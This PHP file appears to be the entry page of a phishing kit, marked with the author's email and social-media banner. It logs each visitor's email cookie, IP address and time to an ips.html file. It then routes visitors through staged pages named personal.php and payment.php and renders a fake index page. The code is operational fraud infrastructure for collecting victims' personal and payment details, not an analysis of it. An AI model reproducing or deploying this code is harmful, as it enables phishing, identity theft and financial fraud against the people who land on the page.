<?php 
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
$rand = @$_GET['dispatch'];
include("../M_files/config.php");
if(@$_SESSION['Done'] == 1) {
	die('<META HTTP-EQUIV="Refresh" Content="0; URL=personal.php?dispatch='.$rand.'">');
}
if(@$_SESSION['Done'] == 2) {
	die('<META HTTP-EQUIV="Refresh" Content="0; URL=payment.php?dispatch='.$rand.'">');
}
$email = @$_COOKIE['email'];
date_default_timezone_set("Africa/Tunis");
$date = date('d/m/Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>Index</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$js = js_index();
$css = css_index();
$html = html_index($css, $js, $email);
die($html);
?>
